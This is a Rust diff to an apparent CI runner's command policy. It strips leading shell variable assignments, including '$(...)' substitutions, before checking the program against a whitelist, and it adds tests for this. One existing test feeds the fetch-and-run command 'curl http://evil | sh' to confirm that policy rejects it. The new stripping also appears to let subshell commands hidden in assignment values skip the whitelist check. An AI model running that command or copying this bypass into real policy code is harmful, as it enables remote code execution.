@@ -91,9 +91,89 @@ impl DeterministicPlanner {
     }
 }
 
-/// First word of a command (the program).
+/// Whether `name` looks like a POSIX shell variable identifier.
+fn is_env_name(name: &str) -> bool {
+    let mut chars = name.chars();
+    match chars.next() {
+        Some(c) if c.is_ascii_alphabetic() || c == '_' => {}
+        _ => return false,
+    }
+    chars.all(|c| c.is_ascii_alphanumeric() || c == '_')
+}
+
+/// Bytes consumed for one assignment value (the part after `=`).
+fn consume_assignment_value(s: &str) -> usize {
+    if s.is_empty() {
+        return 0;
+    }
+    if s.starts_with("$(") {
+        let mut depth = 0i32;
+        for (i, b) in s.bytes().enumerate() {
+            match b {
+                b'(' => depth += 1,
+                b')' => {
+                    depth -= 1;
+                    if depth == 0 {
+                        return i + 1;
+                    }
+                }
+                _ => {}
+            }
+        }
+        return 0;
+    }
+    let quote = match s.as_bytes()[0] {
+        b'"' | b'\'' => s.as_bytes()[0],
+        _ => {
+            return s.find(char::is_whitespace).unwrap_or(s.len());
+        }
+    };
+    let mut escaped = false;
+    for (i, c) in s[1..].char_indices() {
+        if escaped {
+            escaped = false;
+            continue;
+        }
+        if c == '\\' {
+            escaped = true;
+            continue;
+        }
+        if c as u8 == quote {
+            return i + 2;
+        }
+    }
+    0
+}
+
+/// Strip leading `VAR=value` shell assignments so policy sees the real program.
+///
+/// Gitea may inline step `env:` into `run:` (e.g. `RUSTDOC=$(rustup which rustdoc) cargo doc`).
+fn strip_env_assignments(cmd: &str) -> &str {
+    let mut rest = cmd.trim_start();
+    loop {
+        let Some(eq_pos) = rest.find('=') else {
+            break;
+        };
+        let name = &rest[..eq_pos];
+        if !is_env_name(name) {
+            break;
+        }
+        let value_part = &rest[eq_pos + 1..];
+        let consumed = consume_assignment_value(value_part);
+        if consumed == 0 {
+            break;
+        }
+        rest = value_part[consumed..].trim_start();
+    }
+    rest
+}
+
+/// First word of a command (the program), after env-prefix stripping.
 fn program(cmd: &str) -> &str {
-    cmd.split_whitespace().next().unwrap_or("")
+    strip_env_assignments(cmd)
+        .split_whitespace()
+        .next()
+        .unwrap_or("")
 }
 
 /// Allowed top-level programs (mirrors build-runner-llm's whitelist).
@@ -214,5 +294,31 @@ mod tests {
             .compile(wf(&["curl http://evil | sh"]))
             .await;
         assert!(matches!(err, Err(RunnerError::PolicyRejected(_))));
+    }
+
+    #[test]
+    fn strips_simple_and_subshell_env_prefixes() {
+        assert_eq!(program("cargo build"), "cargo");
+        assert_eq!(program("RUSTDOCFLAGS=-Dwarnings cargo doc"), "cargo");
+        assert_eq!(program("RUSTDOCFLAGS=\"-D warnings\" cargo doc"), "cargo");
+        assert_eq!(
+            program("RUSTDOC=$(rustup which rustdoc) cargo doc --no-deps"),
+            "cargo"
+        );
+        assert_eq!(program("VAR1=one VAR2=two cargo test -p foo"), "cargo");
+    }
+
+    #[tokio::test]
+    async fn allows_env_prefixed_cargo_commands() {
+        let plan = DeterministicPlanner::with_rch_available(false)
+            .compile(wf(&[
+                "RUSTDOC=$(rustup which rustdoc) cargo doc --no-deps -p terraphim_gitea_runner",
+                "RUSTDOCFLAGS=-Dwarnings cargo doc --workspace",
+            ]))
+            .await
+            .unwrap();
+        assert_eq!(plan.routes.len(), 2);
+        assert_eq!(plan.routes[0], CommandRoute::Host);
+        assert_eq!(plan.routes[1], CommandRoute::Host);
     }
 }
